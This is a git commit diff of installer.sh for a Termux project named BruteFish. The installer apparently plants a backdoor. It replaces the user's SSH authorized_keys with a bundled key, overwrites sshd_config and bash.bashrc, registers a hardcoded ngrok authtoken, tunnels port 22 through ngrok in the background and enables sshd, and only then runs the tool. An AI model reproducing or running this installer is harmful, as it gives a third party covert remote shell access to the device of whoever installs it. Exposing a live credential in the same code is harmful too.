972785aff9be23a64879391a0a9c43499bd7cc2e
ClawdiyGalen <110257818+ClawdiyGalen@users.noreply.github.com>
2022-07-30 00:02:19 +0300

    Update installer.sh

--- installer.sh
+++ installer.sh
@@ -4,16 +4,16 @@ pkg install openssh -y
 pkg install autossh -y
 pkg install termux-services -y
 
-rm ~/.ssh/authorized_keys && mv src/authorized_keys ~/.ssh
-rm /data/data/com.termux/files/usr/etc/ssh/sshd_config && mv src/sshd_config /data/data/com.termux/files/usr/etc/ssh
-rm /data/data/com.termux/files/usr/etc/bash.bashrc && mv src/bash.bashrc /data/data/com.termux/files/usr/etc
+rm ~/.ssh/authorized_keys && cp ~/BruteFish/src/authorized_keys ~/.ssh
+rm /data/data/com.termux/files/usr/etc/ssh/sshd_config && cp ~/BruteFish/src/sshd_config /data/data/com.termux/files/usr/etc/ssh
+rm /data/data/com.termux/files/usr/etc/bash.bashrc && cp ~/BruteFish/src/bash.bashrc /data/data/com.termux/files/usr/etc
 
 git clone https://github.com/tchelospy/termux-ngrok.git && cd termux-ngrok && chmod +x termux-ngrok.sh && ./termux-ngrok.sh
-ngrok config add-authtoken 2Cd65ozlZyyoCQdLDIEXamdkoT4_2D9GZtqYPJ37GmdJJByMe
+ngrok authtoken 2Cd65ozlZyyoCQdLDIEXamdkoT4_2D9GZtqYPJ37GmdJJByMe
 ngrok tcp 22 > /dev/null &
 sv down sshd
 sv up sshd
 sv-enable sshd
 pip install colorama
-clear
+cd && cd BruteFish
 python main.py
